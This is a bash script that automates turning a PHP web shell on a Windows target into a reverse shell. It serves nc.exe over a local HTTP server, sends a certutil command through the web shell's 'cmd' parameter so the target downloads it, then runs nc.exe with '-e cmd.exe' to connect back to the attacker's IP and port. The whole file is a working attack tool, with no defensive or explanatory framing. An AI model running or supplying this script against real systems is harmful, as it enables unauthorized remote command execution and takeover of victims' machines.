#!/bin/bash 

# Help function 
Help()
{
        echo "################################################################"
        echo "Usage of the script"
        echo "Arguments needed"
        echo "-u => the url where the php file is located"
        echo "-i => the address ip for the http server and the reverse shell"
        echo "-p => the port for the reverse shell"
        echo "################################################################"
        echo 'Exemple of usage '
        echo "./php_rce_to_rev_shell -u http://example/shell.php -i 127.0.0.1 -p 1234"
        echo "################################################################"
}

while getopts "h:u:i:p:" option;
do
        case $option in
          h) Help
             exit;;
          u) url=$OPTARG;;
          p) port=$OPTARG;;
          i) ip=$OPTARG;;
         \?) echo "Error: Invalid Parameter "
            exit;;
        esac
done

if [ -z $url ]
then
        Help
        echo "-u parameter is missing"
        exit;
fi

if [ -z $ip ]
then
        Help
        echo "-i paramter is missing"
        exit;
fi

if [ -z $port ]
then
        Help
        echo "-p parameter is missing"
        exit;
fi

path_nc=/home/kali/bin/nc_exe # Change This
param_name=cmd # change this

if [ ! -f $path_nc/nc.exe ]
then
        echo "The file nc.exe was not found at locaiton " $path_nc "/nc.exe"
        echo "If the path is not the right one don't forget to change it in the script"
        exit;
fi



echo "Trying to access the file at " $url
if curl --head --silent --fail $url 2>/dev/null 1>/dev/null
then
        echo "The file " $url "was found !"
        echo "Trying to download nc.exe on the target"
else
        echo "The file " $url " was not found !"
        exit;
fi


cd $path_nc
python3 -m http.server 80 1>/dev/null&
sleep 1

value=$(ps aux | grep python | grep http.server)
python_process=$(echo $value | awk '{print $2}')

certutil_output=$(curl $url'?'$param_name'=certutil%20-urlcache%20-f%20http://'$ip'/nc.exe%20nc.exe' --output -)

kill $python_process

echo "nc.exe successfull upload on the box"
sleep 1

echo "Trying to triger the files and get the reverse shell to " $ip " on port " $port

curl $url'?'$param_name'=.\nc.exe%20'$ip'%20'$port'%20-e%20cmd.exe' --output - 1>/dev/null 2>/dev/null&

echo "Check you listener for the reverse shell ;) , if nothing came out check that you have open a listener on port " $port

